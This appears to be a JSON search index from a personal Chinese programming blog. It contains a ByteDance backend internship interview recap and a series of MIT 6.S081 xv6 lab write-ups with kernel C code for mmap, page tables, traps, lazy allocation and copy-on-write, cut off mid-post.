{"pages":[{"title":"about","text":"博客用尽一生，活成一个平凡人。","link":"/index.html"},{"title":"about","text":"博客用尽一生，活成一个平凡人。","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"20年字节跳动后端开发面试","text":"第一轮面试首先自我介绍 开发知识问我比较熟悉什么语言，答Java，遂开始问Java。 讲讲HashMap实现原理，HashTable和HashMap有什么不同？ 讲讲ConcurrentHashMap怎么实现的，有什么特点？ Object的wait()和notify()方法有什么作用？ 讲讲Jvm内存结构。 synchronized和Lock在 API/使用上有什么不同？ 了解过Redis吗，Redis有哪些常见数据结构？ 剩余的记不清了… 算法题 如何判断两个单链表是否有交点，单链表是否成环？ n个二极管，超过n/2个二极管是好的。两个二极管可以相互判断对方是好还是坏，好的二极管给的判断一定是准确的，坏的二极管给出的结果是不准确的。找出所有好的二极管。 写出二叉树的层序遍历。 反问 请问岗位工作具体是干什么？ 一般面试学生主要考察基础知识，为啥没有询问 OS/计网的知识？ 答：目前比较需要能尽快上手工作的实习生，所以先考察技术。 第二轮面试首先自我介绍 然后询问一下去年在头条的实习经历，谈了一下简历上的大作业。 基础知识 讲讲网络的五层模型结构。 讲讲三次握手、四次挥手。 为什么要三次握手，四次挥手？ 讲讲线程和进程的区别？ 谈谈对协程的理解。 线程间什么时候产生死锁？如何进行死锁避免/预防？ Java有哪些常见容器？ ConcurrentHashMap在并发访问时相较于HashTable有什么缺点？ 一时没想起来，面试官提示了size()，然后我讲了下ConcurrentHashMap在并发访问时调用size()的过程及overhead。 算法题 写一个二叉树左视图 刚开始想到层序遍历，然后只记录每层第一个节点，后来面试官提示我简化，写成递归版本。 提问 主要开发写什么，用什么技术栈？ HR 面试HR 问 首先自我介绍 问有什么爱好？ 实习时间，对未来的职业规划？ 上次实习的经历，遇到什么困难？ 本次实习预计完成什么目标 对加班的想法，接收度。 提问 实习地点 最终在4-25收到了 offer call，确认了一下薪资福利，实习时间等。总的来说，今年春招实习投递经历主要是积攒经验了，最开始的两家准备不足，被挂的挺惨。之后面向面试学习了一段时间才拿到这个 offer。","link":"/2020/04/17/2020-bytedance-backend-intern/"},{"title":"6.S081 lab10 mmap","text":"mmap和munmap系统调用允许 UNIX 程序对其地址空间进行更为细致的控制。它们可用于在进程间共享内存，将文件映射到进程地址空间，并作为用户级page fault方案的一部分。在本实验室中，我们将在xv6中添加mmap和munmap系统调用，重点是memory-mapped files。 Lab: mmapmmap的 API 如下： 12void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); 在xv6中，addr始终为 0，所以由kernel自行判断应当 map 的地址；prot表示了 mapped memory 的 R、W、X 权限，flags为MAP_SHARED或者MAP_PRIVATE，前者表示对 mapped memory 的修改应写回文件，后者则不需要；offer永远为 0，不用处理文件的偏移量；mmap 成功将返回对应内存起始地址；失败返回0xffffffffffffffff。 munmap(addr, length)需要将从 addr 开始的长度为length的内存unmap。实验指导书保证被munmap的这段内存位于mmap内存区间的头部/尾部或者是全部，munmap不会在中间挖一个洞；当内存是以MAP_SHARED模式被mmap时，需要先将修改写回文件。 看完了对于mmap和munmap的要求，发现其实测试没有一些比较难的case，为我们的实现提供了便利。 之后，就可以跟着 hints 完成实验： 首先添加mmap和munmap的系统调用声明，并且在Makefile中加入_mmaptest。 对 mapped memory 要使用 lazy allocation，就像在之前的实验中那样，这样子使得我们可以在物理内存有限的情况下mmap尽可能大的文件。 记录mmap为每个进程 map 文件的情况，例如地址，长度，权限，对应的文件等等。由于xv6没有真正的内存分配器，所以我们使用一个定长的数组去存储，16 就足够了。 12345678910111213struct VMA { int used; uint64 addr; uint64 end; int prot; int flags; int offset; struct file *f;};// in struct procstruct VMA vma[NVMA];uint64 mmap_start; 实现mmap，从用户地址空间找到空闲处 map 文件，修改对应的VMA结构体记录，当对文件mmap后，应当增加文件的引用计数(filedup)，这样当文件被关闭时，VMA持有的文件指针才不会失效。 最重要的就是找到合适的空闲地址，用于mmap。xv6的用户地址空间如下图： 最顶部是trampoline和trapframe，它们占用了两个 page，和stack之间有很大的空闲地址，我们可以将文件 map 到trapframe之下，不断向下增长，mmap_start记录着trapframe下可用于mmap的起始地址，初始值为PGROUNDDOWN(MAXVA - (2 * PGSIZE))。 1234567891011121314151617181920212223242526272829303132333435uint64sys_mmap(void){ int length, prot, flags, fd; struct file *f; if(argint(1, &amp;length) &lt; 0 || argint(2, &amp;prot) &lt; 0 || argint(3, &amp;flags) &lt; 0 || argfd(4, &amp;fd, &amp;f) &lt; 0) { return 0xffffffffffffffff; } if (!f-&gt;writable &amp;&amp; flags == MAP_SHARED &amp;&amp; (prot &amp; PROT_WRITE)) { return 0xffffffffffffffff; } // find a vma struct proc *p = myproc(); struct VMA *v; for (v = p-&gt;vma; v &lt; p-&gt;vma + NVMA; v++) { if(!v-&gt;used) { break; } } if(v == p-&gt;vma + NVMA) { return -1; } filedup(f); v-&gt;addr = PGROUNDDOWN(p-&gt;mmap_start - length); v-&gt;end = v-&gt;addr + length; p-&gt;mmap_start = v-&gt;addr; v-&gt;used = 1; v-&gt;f = f; v-&gt;prot = prot; v-&gt;flags = flags; v-&gt;offset = 0; return v-&gt;addr;} 当发生page fault时，为其分配一个真实的物理页面，使用readi将文件内容读入内存，然后将物理页面 map 到用户地址空间，记得正确设置页面的权限。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748else if (r_scause() == 13 || r_scause() == 15) { uint64 va = r_stval(); if (va &gt; MAXVA) { p-&gt;killed = 1; } else { if(mmap_alloc(p-&gt;pagetable, va) &lt; 0) { p-&gt;killed = 1; } } }intmmap_alloc(pagetable_t pagetable, uint64 va){ char *mem; struct proc *p = myproc(); struct VMA *v; // find vma struct for (v = p-&gt;vma; v &lt; p-&gt;vma + NVMA; v++) { if(v-&gt;used &amp;&amp; va &gt;= v-&gt;addr &amp;&amp; va &lt; v-&gt;end) { break; } } if (v == p-&gt;vma + NVMA) { return -1; } mem = kalloc(); if(mem == 0){ return -1; } memset(mem, 0, PGSIZE); begin_op(); ilock(v-&gt;f-&gt;ip); int len; if((len = readi(v-&gt;f-&gt;ip, 0, (uint64)mem, va - v-&gt;addr, PGSIZE)) &lt; 0) { iunlock(v-&gt;f-&gt;ip); end_op(); return -1; } iunlock(v-&gt;f-&gt;ip); end_op(); int f = PTE_U | (v-&gt;prot &lt;&lt; 1); if(mappages(pagetable, va, PGSIZE, (uint64)mem, f) != 0) { kfree(mem); return -1; } return 0;} 实现munmap，找到对应的VMA，使用uvmunmap unmap 对应的内存，当一个mmap的所有内存都被 unmap 时，需要减少对应文件的引用计数；如果内存被修改过，且是以MAP_SHARED模式被mmap，那么需要先将内存内容写回文件。理想态下，我们只应当写回dirty page，但是测试中不会检查这一点，所以将所有内存写回文件即可了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071struct file*fileundup(struct file *f){ acquire(&amp;ftable.lock); if(f-&gt;ref &lt; 1) panic(&quot;filedup&quot;); f-&gt;ref--; release(&amp;ftable.lock); return f;}uint64sys_munmap(void){ uint64 addr; int length; if(argaddr(0, &amp;addr) &lt; 0 || argint(1, &amp;length) &lt; 0) { return -1; } return s_munmap(addr, length);}uint64s_munmap(uint64 addr, int length) { struct proc *p = myproc(); struct VMA *v; for (v = p-&gt;vma; v &lt; p-&gt;vma + NVMA; v++) { if(v-&gt;used &amp;&amp; v-&gt;addr &lt;= addr &amp;&amp; addr + length &lt;= v-&gt;end) { break; } } if(v == p-&gt;vma + NVMA) { return -1; } uint64 end = addr + length; uint64 _addr = addr; while (addr &lt; end) { // if already load in if(walkaddr(p-&gt;pagetable, addr)) { if(v-&gt;flags == MAP_SHARED &amp;&amp; v-&gt;f-&gt;writable) { begin_op(); ilock(v-&gt;f-&gt;ip); int size = min(end-addr, PGSIZE); if(writei(v-&gt;f-&gt;ip, 1, addr, addr - v-&gt;addr, size) &lt; size) { iunlock(v-&gt;f-&gt;ip); end_op(); return -1; } iunlock(v-&gt;f-&gt;ip); end_op(); } uvmunmap(p-&gt;pagetable, addr, 1, 1); } addr += PGSIZE; } if(_addr == v-&gt;addr) { v-&gt;addr += length; } else if(_addr + length == v-&gt;end) { v-&gt;end -= length; } if (v-&gt;addr == v-&gt;end) { fileundup(v-&gt;f); v-&gt;used = 0; } return 0;} 实现时遇到两个坑： 在uvmunmap时，首先要判断该内存是否真的被lazy allocation了，否则要像lazylab 中一样，修改uvmunmap，我觉得这样实现比较 ugly，因为破坏了uvmunmap发现错误的功能。 最开始实现时，只要v-&gt;flags == MAP_SHARED就将文件写回，结果在forktest中父子进程内存内容不一致，查看forktest代码发现原来创建的只读文件，只要prot不标志为可写，那么制度文件也是可以用MAP_SHARED模式进行mmap的。所以还要加上v-&gt;f-&gt;writable或者prot &amp; PROT_WRITE。 修改exit代码，使得exit被调用后，unmap 所有被mmap的内存。 12345678struct VMA *v;for (v = p-&gt;vma; v &lt; p-&gt;vma + NVMA; v++) { if(v-&gt;used) { if (s_munmap(v-&gt;addr, v-&gt;end - v-&gt;addr) &lt; 0) { panic(&quot;exit:munmap&quot;); } }} 修改 fork 代码，使得子进程拥有和父进程相同的mmap文件。可以直接为子进程分配新的物理内存用于mmap，不用共享相同物理页面。 123456789101112np-&gt;mmap_start = p-&gt;mmap_start;for(i = 0; i &lt; NVMA; i++) { np-&gt;vma[i].addr = p-&gt;vma[i].addr; np-&gt;vma[i].end = p-&gt;vma[i].end; np-&gt;vma[i].used = p-&gt;vma[i].used; np-&gt;vma[i].flags = p-&gt;vma[i].flags; np-&gt;vma[i].prot = p-&gt;vma[i].prot; if(p-&gt;vma[i].used &amp;&amp; p-&gt;vma[i].f) { np-&gt;vma[i].f = filedup(p-&gt;vma[i].f); }} 这样 mmap lab 就完成了，最终代码见GitHub 仓库。","link":"/2021/03/03/6-S081-lab10-mmap/"},{"title":"6.S081 lab3 page tables","text":"环境配置前两个 lab 比较基础，就不写博客记录了，于是从 lab3 开始。 环境配置参考官网 。如果使用ubuntu20.04的话，环境配置比较简单，只需要从qemu 官网下载源码，手动 build 就完成了；或者使用archlinux，一条命令便全部配置完成。笔者使用的平台是macOS 11.2.1，使用homebrew安装的qemu在前两个 lab 没有问题，但是在第三个 lab 出现了 crash，改为从源码手动编译安装qemu 5.1.0解决了。 2021-02-24 修正：做 lab4 查看call.asm，发现.text 指令长度不一，有的为 2，有的为 4，遂找人请教，猜测是指令压缩导致，于是联想到之前几乎所有人都遇到的一个问题，使用 gdb 打断点调试时，出现：”Cannot access memory at address xxx”。经过大佬查阅并尝试，发现在.gdbinit.tmpl-riscv中加入set riscv use-compressed-breakpoints yes可以有效解决。 Print a page table该部分的内容是打印出第一个进程的用户页表。这个非常简单： 参照freewalk函数，首先在kernel/vm.c添加vmprint: 12345678910111213141516171819202122232425262728void_vmprint(pagetable_t pagetable, int level) { int j; // there are 2^9 = 512 PTEs in a page table. for(int i = 0; i &lt; 512; i++){ pte_t pte = pagetable[i]; if(pte &amp; PTE_V){ for(j = 0; j &lt;= level; j++) { if(j == 0) printf(&quot;..&quot;); else printf(&quot; ..&quot;); } uint64 child = PTE2PA(pte); printf(&quot;%d: pte %p pa %p\\n&quot;, i, pte, child); // this PTE points to a lower-level page table. if ((pte &amp; (PTE_R | PTE_W | PTE_X)) == 0) { _vmprint((pagetable_t)child, level + 1); } } }}// print the page tablesvoidvmprint(pagetable_t pagetable) { printf(&quot;page table %p\\n&quot;, pagetable); _vmprint(pagetable, 0);} 然后在exec.c中插入代码打印第一个进程的用户页表： 123if(p-&gt;pid == 1) { vmprint(p-&gt;pagetable);} 启动后打印出如下内容： 12345678910page table 0x0000000087f67000..0: pte 0x0000000021fd8c01 pa 0x0000000087f63000.. ..0: pte 0x0000000021fd8801 pa 0x0000000087f62000.. .. ..0: pte 0x0000000021fd901f pa 0x0000000087f64000.. .. ..1: pte 0x0000000021fd840f pa 0x0000000087f61000.. .. ..2: pte 0x0000000021fd801f pa 0x0000000087f60000..255: pte 0x0000000021fd9801 pa 0x0000000087f66000.. ..511: pte 0x0000000021fd9401 pa 0x0000000087f65000.. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000.. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000 在用户地址空间最高处，511，510 entry 对应trampoline和trapframe。在用户地址空间最低处，0，1，2 entry 对应text\\data，guard page，stack，如果修改下_vmprint打印出更多信息，可以发现 entry 1 的PTE_U是无效的，可以防止栈溢出。顶级页表只使用到第 255 个 entry，因为xv6只使用了 38 位地址。 A kernel page table per process第二部分是让每个进程拥有单独的内核页表，为第三部分直接使用用户虚拟地址做准备。 首先在kernel/proc.h中的struct proc定义中添加 1pagetable_t kpagetable; 仿照kvminit，实现一个初始化进程内核页表的函数： 1234567891011121314151617181920212223242526pagetable_tproc_kvminit(void){ int i; pagetable_t proc_kpagetable = uvmcreate(); if (proc_kpagetable == 0) { return 0; } for(i = 1; i &lt; 512; i++) { proc_kpagetable[i] = kernel_pagetable[i]; } ukvmmap(proc_kpagetable, UART0, UART0, PGSIZE, PTE_R | PTE_W); ukvmmap(proc_kpagetable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W); ukvmmap(proc_kpagetable, CLINT, CLINT, 0x10000, PTE_R | PTE_W); ukvmmap(proc_kpagetable, PLIC, PLIC, 0x400000, PTE_R | PTE_W); return proc_kpagetable;}voidukvmmap(pagetable_t kernel_pagetable ,uint64 va, uint64 pa, uint64 sz, int perm){ if(mappages(kernel_pagetable, va, sz, pa, perm) != 0) panic(&quot;kvmmap&quot;);} 根据后续实验，我们能修改的内核地址空间不超过顶级页表的第一个 entry 的地址范围，所以我们和kernel_pagetable共享其他 entry，直接进行复制，这样能够节约次级页表占用的内存空间。 kernel/proc.c中的allocproc函数，负责分配、初始化进程，在其中如下调用： 123456p-&gt;kpagetable = proc_kvminit();if (p-&gt;kpagetable == 0) { freeproc(p); release(&amp;p-&gt;lock); return 0;} 之后，官网的hint提到需要为每个进程初始化kernel stack，可能需要将proinit中的部分代码转移到allocproc中，由于我们和kernel_pagetable共享了顶级页表 entry 1 意外的所有页表，所以仍可以将kernel stack的初始化代码留在procinit中。 接下来，修改scheduler，当调度到进程执行时，将进程的内核页表载入stap寄存器（参考kvminithart），当没有进程运行时，使用kernel_pagetable： 1234567891011121314151617if(p-&gt;state == RUNNABLE) { // Switch to chosen process. It is the process's job // to release its lock and then reacquire it // before jumping back to us. p-&gt;state = RUNNING; c-&gt;proc = p; w_satp(MAKE_SATP(p-&gt;kpagetable)); sfence_vma(); swtch(&amp;c-&gt;context, &amp;p-&gt;context); // Process is done running for now. // It should have changed its p-&gt;state before coming back. c-&gt;proc = 0; kvminithart(); found = 1;} 之后，我们需要在free_proc中添加释放内核页表的代码： 1234567891011121314151617181920if(p-&gt;kpagetable) { proc_freekpagetable(p-&gt;kpagetable);}voidproc_freekpagetable(pagetable_t kpagetable) { pte_t pte = kpagetable[0]; pagetable_t level1 = (pagetable_t) PTE2PA(pte); for (int i = 0; i &lt; 512; i++) { pte_t pte = level1[i]; if (pte &amp; PTE_V) { uint64 level2 = PTE2PA(pte); kfree((void *) level2); level1[i] = 0; } } kfree((void *) level1); kfree((void *) kpagetable);} 注意，由于和kernel_pagetable进行了共享，所以仅释放第一个 entry 对应的次级页表；如果没有共享则需释放整个三级页表（都不能释放物理内存）。 此外，如果将kernel stack的初始化代码放置在了allocproc中，那么需要在freeproc中释放并 ummapkernel stack，并且需要在kvmpa做出修改，使用： 1pte = walk(myproc()-&gt;kpagetable, va, 0); Simplify copyin/copyinstr该部分需要利用第二部分中的进程内核页表简化copyin/copyinstr函数，使之不需要传递用户页表。 根据提示，将进程的用户页表复制到其内核页表中，这样每个进程内核页表都有其对应用户页表的副本。复制的用户页表虚拟地址不能超过PLIC，之上是kernel占有的地址空间，所以需要判断。 12345678910111213141516171819voidu2kvmcopy(pagetable_t pagetable, pagetable_t kpagetable, uint64 oldsz, uint64 newsz){ uint64 va; pte_t *upte; pte_t *kpte; if(newsz &gt;= PLIC) panic(&quot;u2kvmcopy: newsz too large&quot;); for (va = oldsz; va &lt; newsz; va += PGSIZE) { upte = walk(pagetable, va, 0); kpte = walk(kpagetable, va, 1); *kpte = *upte; // because the user mapping in kernel page table is only used for copyin // so the kernel don't need to have the W,X,U bit turned on *kpte &amp;= ~(PTE_U|PTE_W|PTE_X); }} 注意将复制到内核页表的 entry 取消PTE_U权限。 之后在exec/fork/sbrk中，每次用户页表发生改变时，复制到内核页表中。 对于exec: 12345if(p-&gt;pid == 1) { vmprint(p-&gt;pagetable);}u2kvmcopy(p-&gt;pagetable, p-&gt;kpagetable, 0, p-&gt;sz); 对于fork: 12345u2kvmcopy(np-&gt;pagetable, np-&gt;kpagetable, 0, np-&gt;sz);release(&amp;np-&gt;lock);return pid; 对于sbrk，修改growproc: 1234567891011if(n &gt; 0){ if (PGROUNDUP(sz + n) &gt;= PLIC) return -1; if((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == 0) { return -1; }} else if(n &lt; 0){ sz = uvmdealloc(p-&gt;pagetable, sz, sz + n); // clean that pte bits}u2kvmcopy(p-&gt;pagetable, p-&gt;kpagetable, p-&gt;sz, sz); 之后，在userinit中，将第一个进程的用户页表复制到内核页表： 12345p-&gt;state = RUNNABLE;u2kvmcopy(p-&gt;pagetable, p-&gt;kpagetable, 0, p-&gt;sz);release(&amp;p-&gt;lock); 最后，将原cpoyin/copyinstr修改为对cpoyin_new/copyinstr_new的调用即可。 在copyin_new中，做了srcva + len &lt; srcva判断条件。这是为了防止len过大，导致溢出。 最终代码见github 仓库。","link":"/2021/02/22/6-S081-lab3-page-tables/"},{"title":"6.S081 lab4 traps","text":"RISC-V assembly这是一个简单的RISC-V汇编热身关卡。 我们需要查看user/call.asm来回答一些问题，其主要内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142int g(int x) { 0: 1141 addi sp,sp,-16 2: e422 sd s0,8(sp) 4: 0800 addi s0,sp,16 return x+3;} 6: 250d addiw a0,a0,3 8: 6422 ld s0,8(sp) a: 0141 addi sp,sp,16 c: 8082 ret000000000000000e &lt;f&gt;:int f(int x) { e: 1141 addi sp,sp,-16 10: e422 sd s0,8(sp) 12: 0800 addi s0,sp,16 return g(x);} 14: 250d addiw a0,a0,3 16: 6422 ld s0,8(sp) 18: 0141 addi sp,sp,16 1a: 8082 ret000000000000001c &lt;main&gt;:void main(void) { 1c: 1141 addi sp,sp,-16 1e: e406 sd ra,8(sp) 20: e022 sd s0,0(sp) 22: 0800 addi s0,sp,16 printf(&quot;%d %d\\n&quot;, f(8)+1, 13); 24: 4635 li a2,13 26: 45b1 li a1,12 28: 00000517 auipc a0,0x0 2c: 7b850513 addi a0,a0,1976 # 7e0 &lt;malloc+0xea&gt; 30: 00000097 auipc ra,0x0 34: 608080e7 jalr 1544(ra) # 638 &lt;printf&gt; exit(0); 38: 4501 li a0,0 3a: 00000097 auipc ra,0x0 3e: 276080e7 jalr 630(ra) # 2b0 &lt;exit&gt; Which registers contain arguments to functions? For example, which register holds 13 in main’s call to printf? 根据RISC-V的 calling convention，a0-a7,fa0-fa7包含了函数的参数。调用printf时，a0为格式化字符串，a1是 12，a2是 13。 Where is the call to function f in the assembly code for main? Where is the call to g? (Hint: the compiler may inline functions.) 由于f和g函数都是简单的常数计算，传递的参数也是常数 8，所以函数调用被编译器优化掉了，在0x26位置，直接将函数调用结果立即数 12 载入寄存器a1。 At what address is the function printf located? 从代码中看，很显然，在0x638得位置。 What value is in the register ra just after the jalr to printf in main? jalr指令是链接并跳转，将返回地址保存到ra寄存器，所以应为0x38。 12unsigned int i = 0x00646c72;printf(&quot;H%x Wo%s&quot;, 57616, &amp;i); 运行以上代码，输出HE110 World。数字 57616 的 16 进制表示为 0xE110；RISC-V采用小端法表示，16 进制的 72、6c、64、00 表示字符串“rld\\0”，如果改为大端法，则应反过来，变为i=0x726c6400。 1printf(&quot;x=%d y=%d&quot;, 3); 该printf调用少了一个参数，根据 calling convention，对y=%d会取a2的值进行输出。 Backtrace该步骤需要实现一个backtrace函数，打印出调用轨迹，即每次调用的返回地址。 xv6 运行时的 stack 结构如下图： s0/fp中存储着当前的 frame pointer，fp-8指向返回地址，fp-16指向上一个fp地址。 所以我们只需要不断打印当前fp的返回地址并向前追溯，直到 stack 顶部。 首先在kernel/riscv.h添加内联汇编函数以获取fp值： 1234567static inline uint64r_fp(){ uint64 x; asm volatile(&quot;mv %0, s0&quot; : &quot;=r&quot; (x) ); return x;} 然后在kernel/printf.c实现backtrace： 1234567891011voidbacktrace(void) { uint64 fp, top; fp = r_fp(); top = PGROUNDUP(fp); while(1) { if (fp == top) break; printf(&quot;%p\\n&quot;, *(uint64*)(fp-8)); fp = *(uint64*)(fp-16); }} 之后在sys_sleep和panic中加入对backtrace的调用即可。 Alarm本关需要实现一个sigalarm(interval, handler)系统调用，cpu 每消耗 interval 个 ticks 后，调用一次 handler 函数。 首先要在user/user.h添加对新系统调用的用户接口： 12int sigalarm(int ticks, void (*handler)());int sigreturn(void); sigreturn是一个被设计用来帮助我们实现sigalarm的函数，每个handler执行结束后，都调用sigreturn。 首先要在proc中添加新的字段，记录interval，handler以及所需的辅助变量，在allocpoc中对它们进行初始化，在系统调用执行时，保存相应的值到proc中。 12345678910uint64sys_sigalarm(void){ struct proc *p = myproc(); if (argint(0, &amp;(p-&gt;alarm_interval)) &lt; 0) return -1; if (argaddr(1, &amp;(p-&gt;alarm_hanlder)) &lt; 0) return -1; return 0;} 之后，我们需要在usertrap识别到 timer interrupt 时，进行处理，hints 告诉我们，是which_dev == 2。 123456789// give up the CPU if this is a timer interrupt.if(which_dev == 2) { p-&gt;passed++; if (p-&gt;passed == p-&gt;alarm_interval) { p-&gt;passed = 0; p-&gt;trapframe-&gt;epc = p-&gt;alarm_hanlder; } yield();} 此时只需让sigreturn直接返回 0，这样简单地添加代码，可以让test0打印出 alarm，但是随后，程序便逻辑崩溃，无法通过测试。这是因为当 kernle 处理完 time interru，回到用户模式，pc 指向 handler 的位置，之后开始执行 handler 函数，在 handler 函数尾部，调用sigreturn陷入 kernel，并无操作，再次返回用户态，执行 handler 尾部的ret。此时用于ret指令的返回地址寄存器ra所存储的值，是在 time interrupt 之时，test 函数执行中产生的ra的值，并非是 time interrupt 发生时，正在执行的代码地址，所以程序不能返回正确位置，并且 handler 执行过程中，修改了的部分寄存器也需要恢复。 于是，我们需要在 handler 执行前保存tramframe，在执行后的sigreturn中恢复tramframe，让代码返回到正确的位置执行，并使寄存器的数值复原。同时，根据 hints，为了防止 handler 执行过程中被重复调用，添加permission字段来进行控制，此外，interval==0时，意味着取消 alarm。 123456789uint64sys_sigreturn(void){ struct proc* p = myproc(); p-&gt;permission = 1; *p-&gt;trapframe = p-&gt;alarm_frame; printf(&quot;ra:%p\\n&quot;, p-&gt;trapframe-&gt;ra); return 0;} 在usertrap中： 123456789101112if(which_dev == 2) { p-&gt;passed++; if (p-&gt;permission &amp;&amp; p-&gt;alarm_interval &amp;&amp; p-&gt;passed == p-&gt;alarm_interval) { p-&gt;passed = 0; p-&gt;permission = 0; p-&gt;alarm_frame = *p-&gt;trapframe; p-&gt;trapframe-&gt;epc = p-&gt;alarm_hanlder; } yield();} 到此，便完成了 lab4 traps。 此外，还有一点，笔者曾尝试只保存tramframe中的caller save寄存器，但是无法通过测试。最终查看asm文件发现：callee save寄存器是在被调用函数尾部的 ret 指令前进行恢复的，但是在sigreturn中通过恢复epc的方式，将pc直接指向了被 time interrupt 打断执行的代码位置，所以callee save寄存器在被修改后并未被复原，我们必须保存trapframe中的所有寄存器。 最终代码见github 仓库。","link":"/2021/02/24/6-S081-lab4-traps/"},{"title":"6.S081 lab5 lazy","text":"Eliminate allocation from sbrk()这次实验的第一关非常简单，就是从sbrk调用中取消内存分配，为之后的lay allocation做准备。 1234567891011121314uint64sys_sbrk(void){ int addr; int n; if(argint(0, &amp;n) &lt; 0) return -1; struct proc *p = myproc(); addr = p-&gt;sz; p-&gt;sz += n; return addr;} hints 提示我们，修改完代码后，尝试运行echo hi，会产生类似下面的结果: 12345$ echo hiusertrap(): unexpected scause 0x000000000000000f pid=3 sepc=0x0000000000001258 stval=0x0000000000004008va=0x0000000000004000 pte=0x0000000000000000panic: uvmunmap: not mapped 其实并不一定是echo才会导致 crash，其他的执行任意的命令或者输入无意义字符都会导致 crash。在user/umalloc.c中，morecore调用了sbrk，malloc调用了morecore。在user/sh.c中，shell 运行过程中不断地调用malloc为 command 申请分配空间，然后运行 command。这个过程中，malloc 并未真正分配空间，运行时访问到对应虚拟地址就会产生 page fault，导致 panic； Lazy allocation这一关需要我们实现lazy allocation，在usertrap()中处理page fault，为产生page fault的虚拟地址分配一个真实的物理页面，并 map 到对应虚拟地址。 r_scause()用于获取 trap 产生的原因，为 13/15 时为page fault。 r_stval()获取stval寄存器值，它是导致page fault的虚拟地址值。 uvmunmap()会 panic，因为进程地址空间有些虚拟地址并未被 map，所要加以修改。 参照uvmalloc()，完成如下函数，为虚拟地址va分配一个真实物理页： 1234567891011121314151617uint64lazy_uvmalloc(pagetable_t pagetable, uint64 va){ char *mem; va = PGROUNDDOWN(va); mem = kalloc(); if(mem == 0){ return -1; } memset(mem, 0, PGSIZE); if(mappages(pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != 0) { kfree(mem); return -1; } return 0;} 在usertrap()中加入对于page fault的处理： 123456else if(cause == 13 || cause == 15) { uint64 va = r_stval(); if(lazy_uvmalloc(p-&gt;pagetable, va) != 0) { p-&gt;killed = 1; }} 添加以上代码之后，在uvmunmap()中添加如下修改，取消panic： 123456if((pte = walk(pagetable, a, 0)) == 0) // panic(&quot;uvmunmap: walk&quot;); continue;if((*pte &amp; PTE_V) == 0) // panic(&quot;uvmunmap: not mapped&quot;); continue; 完成如上代码后，echo hi可以正常运行。 Lazytests and Usertests第三关需要处理第二关的一些遗留细节问题，完善lazy allocation，使之通过全部测试。 Handle negative sbrk() arguments. 对于负数参数，需要unmap对应页面: 12345if(n &lt; 0){ p-&gt;sz = uvmdealloc(p-&gt;pagetable, p-&gt;sz, p-&gt;sz + n);} else { p-&gt;sz += n;} Kill a process if it page-faults on a virtual memory address higher than any allocated with sbrk(). Handle faults on the invalid page below the user stack. 这里需要判断产生page fault的 va 是否在当前进程拥有的地址范围之外。 12if (va &gt;= p-&gt;sz || va &lt; p-&gt;trapframe-&gt;sp) p-&gt;killed = 1; Handle the parent-to-child memory copy in fork() correctly. 在fork()中，使用如下代码将内存从父进程复制到子进程： 123456// Copy user memory from parent to child.if(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; 0){ freeproc(np); release(&amp;np-&gt;lock); return -1;} 进入uvmcopy()，做出如下修改： 123456if((pte = walk(old, i, 0)) == 0) // panic(&quot;uvmcopy: pte should exist&quot;); continue;if((*pte &amp; PTE_V) == 0) // panic(&quot;uvmcopy: page not present&quot;); continue; Handle the case in which a process passes a valid address from sbrk() to a system call such as read or write, but the memory for that address has not yet been allocated. 当进程进行syscall时，会陷入 kernel，此时stap切换为内核页表，RISC-V硬件无法再为用户地址空间产生page fault，所以当用户执行read()和write()，将用户地址空间的有效虚拟地址传递给内核时，如果该虚拟地址没有 map 到有效物理内存，将会导致程序 panic。kernel 运行时，使用walkaddr进行虚实地址转换，所以我们需要修改其中的代码，当虚拟地址有效而页表中未 map 时，尝试为其分配物理内存： 1234567891011121314151617181920212223242526uint64walkaddr(pagetable_t pagetable, uint64 va){ pte_t *pte; uint64 pa; struct proc *p = myproc(); if(va &gt;= MAXVA) return 0; pte = walk(pagetable, va, 0); if(pte == 0 || (*pte &amp; PTE_V) == 0) { if (va &gt;= p-&gt;sz || va &lt; p-&gt;trapframe-&gt;sp) { return 0; } if(lazy_uvmalloc(pagetable, va) == 0) { pte = walk(pagetable, va, 0);; } else { return 0; } } if((*pte &amp; PTE_U) == 0) return 0; pa = PTE2PA(*pte); return pa;} Handle out-of-memory correctly: if kalloc() fails in the page fault handler, kill the current process. 在关卡 2 中，已经做到了这一点，当lazy_uvmalloc()调用kalloc()失败时，返回非 0，杀掉进程： 123if(lazy_uvmalloc(p-&gt;pagetable, va) != 0) { p-&gt;killed = 1;} 做完如上修改，便能通过所有测试。 最终代码见github 仓库。","link":"/2021/02/25/6-S081-lab5-lazy/"},{"title":"6.S081 lab6 cow","text":"Copy-on-Write Fork for xv6这次 lab 只有一关，那就是为xv6实现copy on write。 xv6中的fork()系统调用将父进程的用户内存全部复制到子进程中。如果父进程内存占用很大，复制可能需要很长的时间。更糟糕的是，通常来说，这个复制在很大程度上是浪费的；例如，在子进程中，fork()之后的exec()调用会导致子进程丢弃复制的内存，可能大部分内存都没有来得及使用。另一方面，如果父子双方都使用一个page，并且其中一方或双方需要写这个page，那么确实需要复制。 根据官网给的提示： 使用引用计数，对每个物理页面维护一个reference count，记录物理页面被 map 的次数。 kernel/kalloc.c 1234567891011121314151617181920212223struct { struct spinlock lock; struct run *freelist; int rc[PHYSTOP / PGSIZE];} kmem;voidfreerange(void *pa_start, void *pa_end){ char *p; p = (char*)PGROUNDUP((uint64)pa_start); for(; p + PGSIZE &lt;= (char*)pa_end; p += PGSIZE) { kmem.rc[(uint64)p / PGSIZE] = 1; kfree(p); }}voidincrease_rc(uint64 pa) { acquire(&amp;kmem.lock); kmem.rc[pa / PGSIZE]++; release(&amp;kmem.lock);} 利用 RISC-V PTE 中的RSW (reserved for software)位来标记cow页，修改uvmcopy(),在复制内存时，仅将父进程的物理页面 map 到子进程页表中，并清除双方PTE中的PTE_W标志。 在kernel/riscv.h中加入： 1#define PTE_COW (1L 